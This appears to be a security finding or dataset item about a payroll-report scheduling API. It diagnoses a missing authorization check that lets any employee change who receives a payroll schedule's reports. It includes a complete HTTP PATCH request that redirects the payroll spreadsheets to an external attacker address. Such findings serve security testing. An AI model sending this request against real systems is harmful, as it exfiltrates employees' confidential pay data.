diagnosis: The endpoint allows updating the recipient email list for a payroll report cron job by scheduleId. It fails to check if the caller is an HR payroll administrator for the specific department associated with the schedule, allowing any authenticated employee to redirect monthly payroll spreadsheets to their personal email.
exploit_request:
PATCH /api/cron/payroll-reports/sched_exec_payroll_2025/recipients HTTP/1.1
Host: hr-jobs.corporate.net
Authorization: Bearer <regular_employee_token>
Content-Type: application/json

{"recipientEmails": ["attacker@external.com"]}
